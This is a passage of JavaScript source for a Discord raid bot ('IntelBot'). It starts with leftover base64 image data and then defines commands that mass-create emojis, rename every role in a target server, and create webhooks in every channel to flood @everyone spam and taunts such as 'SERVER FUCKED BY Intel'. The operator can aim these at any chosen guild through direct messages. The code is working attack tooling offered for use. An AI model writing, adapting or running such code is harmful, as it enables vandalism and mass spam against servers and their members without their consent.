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";
                    await guildxd.emojis.create({name:`IntelBotontop`, attachment:b64_png});
                    emj_i++;
                } catch (e) {
                    console.log(e.message);
                };
            };
            await msg.author.send({embeds: [new EmbedBuilder().setDescription(`:gem: ${emj_i} emojis creados correctamente.`)],});
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"renameroles"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            let nm_rl_atck = users_data[msg.author.id]?.nm_roles_attack ? users_data[msg.author.id].nm_roles_attack : "IntelBot on top";
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`IntelBot on top!`})
            ]});
            let rls = await guildxd.roles.fetch();
            let rl_i=0;
            for (let rl of rls.values()) {
                try {
                    await rl.setName(`${nm_rl_atck}`);
                    rl_i++;
                } catch (e) {
                    console.log(e.message);
                };             
            };
            await msg.author.send({embeds: [new EmbedBuilder().setDescription(`:gem: ${rl_i} roles renombrados correctamente.`)],});

        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"wbspam"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            let txt_atck_ = users_data[msg.author.id]?.text_attack ? users_data[msg.author.id].text_attack : "https://discord.gg/RR2qSCG45d";
            let inv_atck = users_data[msg.author.id]?.invite_attack ? users_data[msg.author.id].invite_attack : "https://discord.gg/RR2qSCG45d";
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`IntelBot on top!`})
            ]});
            async function spam_wh(wh_url) {
                try {
                    const whxd = new WebhookClient({url:wh_url});
                    for (let index = 0; index < 100; index++) {
                        try {
                            await whxd.send({content:`** https://discord.gg/AYRAD4jUdB **\n${txt_atck_}\n ${inv_atck} \n@everyone`, embeds:[
                                new EmbedBuilder()
                                .setTitle(` ‎                           ‎ **SERVER FUCKED BY Intel**\n ‎                                 ‎ **#IntelBot**`)
                                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ :gem:\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **🌎 best raid bot.**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **[HOW TO RAID DISCORD SERVER](https://discord.gg/AYRAD4jUdB)**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ https://discord.gg/AYRAD4jUdB`)
                                .setImage(`https://c.tenor.com/eF4-zscgHU4AAAAd/tenor.gif`)
                            ]});
                        } catch (e) {
                            console.log(e.message);
                        };
                    };
                } catch (e) {
                    console.log(e.message);
                }
            };
            let i_wh=0;
            let wh_b=false;
            let webhooks = [];
            async function create_webhok(ch_id, ch_size) {
                try {
                    const res = await fetch(`https://discord.com/api/v9/channels/${ch_id}/webhooks`,{
                        method:"POST",
                        headers:{
                            "Authorization":`Bot ${bot_token}`,
                            "content-type":"application/json"
                        },
                        body: JSON.stringify({
                            "name":"IntelBot On Top | .gg/AYRAD4jUdB"
                        })
                    });
                    const resJson = await res.json();
                    if(res.status === 200){
                        i_wh++;
                        webhooks.push(`https://discord.com/api/webhooks/${resJson['id']}/${resJson['token']}`);
                        if(i_wh>=ch_size && !wh_b){
                            wh_b=true;
                            for (let wh of webhooks.values()) {
                                spam_wh(wh);
                            };
                        };
                    } else if(res.status === 429){
                        if(resJson['retry_after']){
                            await wait_ms(resJson['retry_after']+100);
                        };
                    };
                } catch (e) {console.log(e)}
            };
            let chs = await guildxd.channels.fetch();
            for (let ch of chs.values()) {
                create_webhok(ch.id, chs.size);
                await wait_ms(30);
            };
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_1+"existentwbspam"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            let txt_atck_ = users_data[msg.author.id]?.text_attack ? users_data[msg.author.id].text_attack : "https://discord.gg/RR2qSCG45d";
            let inv_atck = users_data[msg.author.id]?.invite_attack ? users_data[msg.author.id].invite_attack : "https://discord.gg/RR2qSCG45d";
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`wapned bot replikt on top!`})
            ]});
            async function spam_wh(wh_url) {
                try {
                    const whxd = new WebhookClient({url:wh_url});
                    for (let index = 0; index < 100; index++) {
                        try {
                            await whxd.send({content:`** https://discord.gg/zCQ8jQ2GBf **\n${txt_atck_}\n ${inv_atck} \n@everyone`, embeds:[
                                new EmbedBuilder()
                                .setTitle(` ‎                           ‎ **SERVER FUCKED BY Intel**\n                               ‎ **#IntelBot**`)
                                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ :gem:\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **🌎 best raid bot.**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **[HOW TO RAID DISCORD SERVER](https://discord.gg/AYRAD4jUdB)**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ https://discord.gg/AYRAD4jUdB`)
                                .setImage(`https://c.tenor.com/eF4-zscgHU4AAAAd/tenor.gif`)
                            ]});
                        } catch (e) {
                            console.log(e.message);
                        };
                    };
                } catch (e) {
                    console.log(e.message);
                }
            };
            let wh_i=0;
            let chs = await guildxd.channels.fetch();
            for (let ch of chs.values()) {
                let whs = await ch.fetchWebhooks();
                for (let wh of whs.values()) {
                    spam_wh(wh.url);
                    wh_i++;
                };
            };
